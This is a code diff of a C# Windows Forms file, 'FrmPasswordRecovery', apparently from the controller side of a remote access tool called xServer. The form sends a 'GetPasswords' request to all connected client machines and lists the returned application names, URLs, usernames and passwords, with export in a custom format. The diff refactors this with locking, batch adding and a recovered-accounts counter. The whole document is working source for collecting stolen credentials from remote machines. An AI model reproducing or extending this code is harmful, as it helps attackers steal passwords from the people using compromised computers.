@@ -1,105 +1,104 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Text;
 using System.Windows.Forms;
+using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
-using xServer.Core.Utilities;
-using xServer.Settings;
 
 namespace xServer.Forms
 {
     public partial class FrmPasswordRecovery : Form
     {
-        public List<Client> ConnectedClients { get; set; }
+        private readonly Client[] _clients;
+        private readonly object _addingLock = new object();
 
-        public FrmPasswordRecovery(List<Client> connectedClients)
+        public FrmPasswordRecovery(Client[] connectedClients)
         {
-            
-            ConnectedClients = connectedClients;
-            foreach (Client client in ConnectedClients)
+            _clients = connectedClients;
+            foreach (Client client in _clients)
             {
-                // Set their frmpass to this
+                if (client == null || client.Value == null) continue;
                 client.Value.FrmPass = this;
             }
 
             InitializeComponent();
-            this.Text = WindowHelper.GetWindowTitle("Password Recovery", ConnectedClients.Count);
+            this.Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
 
-            txtFormat.Text = XMLSettings.SaveFormat;
+            txtFormat.Text = Settings.SaveFormat;
+        }
 
-            // Get passwords from clients
-            SendRefresh();
+        private void FrmPasswordRecovery_Load(object sender, EventArgs e)
+        {
+            RecoverPasswords();
+        }
+
+        private void FrmPasswordRecovery_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            foreach (Client client in _clients)
+            {
+                if (client == null || client.Value == null) continue;
+                client.Value.FrmPass = null;
+            }
         }
 
         #region Public Members
-        public void SendRefresh()
+        public void RecoverPasswords()
         {
-            lstPasswords.Items.Clear();
-            lstPasswords.Groups.Clear();
+            allToolStripMenuItem2_Click(null, null);
 
-            foreach (Client client in ConnectedClients)
-            {
-                if (client == null) continue;
-                // Send request packet
-                new Core.Packets.ServerPackets.GetPasswords().Execute(client);
-            }
+            var req = new Core.Packets.ServerPackets.GetPasswords();
+            foreach (var client in _clients.Where(client => client != null && client.Connected))
+                req.Execute(client);
         }
 
-        public void AddPassword(LoginInfo login, string identification)
+        public void AddPasswords(RecoveredAccount[] logins, string identification)
         {
             try
             {
-                ListViewGroup lvg = GetGroupFromApplication(login.Application);
-
-                ListViewItem lvi = new ListViewItem() { Tag = login, Text = identification };
-                lvi.SubItems.Add(login.URL); // URL
-                lvi.SubItems.Add(login.Username); // User
-                lvi.SubItems.Add(login.Password); // Pass
-
-                if (lvg == null)
+                lock (_addingLock)
                 {
-                    // No group exists for the application in question
+                    var items = new List<ListViewItem>();
 
-                    lvg = new ListViewGroup();
-
-                    lvi.Group = lvg;
-                    // Space in the application name will not be allowed in the property
-                    lvg.Name = login.Application.Replace(" ", "");
-                    lvg.Header = login.Application;
-
-                    this.Invoke(new MethodInvoker(delegate
+                    foreach (var login in logins)
                     {
-                       lstPasswords.Groups.Add(lvg);
-                       lstPasswords.Items.Add(lvi);
-                    }));
-                }
-                else
-                {
-                    // Group exists for the application, lets update it with our new item appended
+                        var lvi = new ListViewItem { Tag = login, Text = identification };
 
-                    // Get the group index so we can quickly set it after we've completed operations
-                    int groupIndex = lstPasswords.Groups.IndexOf(lvg);
+                        lvi.SubItems.Add(login.URL); // URL
+                        lvi.SubItems.Add(login.Username); // User
+                        lvi.SubItems.Add(login.Password); // Pass
 
-                    lvi.Group = lvg;
+                        var lvg = GetGroupFromApplication(login.Application);
 
-                    this.Invoke(new MethodInvoker(delegate
-                    {
-                        lstPasswords.Groups[groupIndex] = lvg;
-                        lstPasswords.Items.Add(lvi);
-                    }));
+                        if (lvg == null) //Create new group
+                        {
+                            lvg = new ListViewGroup { Name = login.Application.Replace(" ", string.Empty), Header = login.Application };
+                            this.Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg))); //Add the new group
+                        }
+
+                        lvi.Group = lvg;
+                        items.Add(lvi);
+                    }
+
+                    Invoke(new MethodInvoker(() => { lstPasswords.Items.AddRange(items.ToArray()); }));
+                    UpdateRecoveryCount();
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                MessageBox.Show("Error on adding password: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
         #endregion
 
         #region Private Members
-        private string ConvertToFormat(string format, LoginInfo login)
+        private void UpdateRecoveryCount()
+        {
+            Invoke(new MethodInvoker(() => groupBox1.Text = string.Format("Recovered Accounts [ {0} ]", lstPasswords.Items.Count)));
+        }
+
+        private string ConvertToFormat(string format, RecoveredAccount login)
         {
             return format
                 .Replace("APP", login.Application)
@@ -117,14 +116,14 @@ namespace xServer.Forms
             {
                 foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                 {
-                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag));
                 }
             }
             else
             {
                 foreach (ListViewItem lvi in lstPasswords.Items)
                 {
-                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag));
                 }
             }
           
@@ -145,20 +144,19 @@ namespace xServer.Forms
 
         private void txtFormat_TextChanged(object sender, EventArgs e)
         {
-            XMLSettings.WriteValue("SaveFormat", txtFormat.Text);
+            Settings.SaveFormat = txtFormat.Text;
         }
         #endregion
 
         #region Group Methods
-        public ListViewGroup GetGroupFromApplication(string app)
+        private ListViewGroup GetGroupFromApplication(string app)
         {
             ListViewGroup lvg = null;
-            this.Invoke(new MethodInvoker(delegate {
-                foreach (ListViewGroup group in lstPasswords.Groups)
+            this.Invoke(new MethodInvoker(delegate
+            {
+                foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
                 {
-                    // Check to see if the current group header is for our application
-                    if (group.Header == app)
-                        lvg = group;
+                    lvg = @group;
                 }
             }));
             return lvg;
@@ -217,13 +215,18 @@ namespace xServer.Forms
 
         private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            SendRefresh();
+            RecoverPasswords();
         }
 
         private void allToolStripMenuItem2_Click(object sender, EventArgs e)
         {
-            lstPasswords.Items.Clear();
-            lstPasswords.Groups.Clear();
+            lock (_addingLock)
+            {
+                lstPasswords.Items.Clear();
+                lstPasswords.Groups.Clear();
+
+                UpdateRecoveryCount();
+            }
         }
 
         private void selectedToolStripMenuItem2_Click(object sender, EventArgs e)
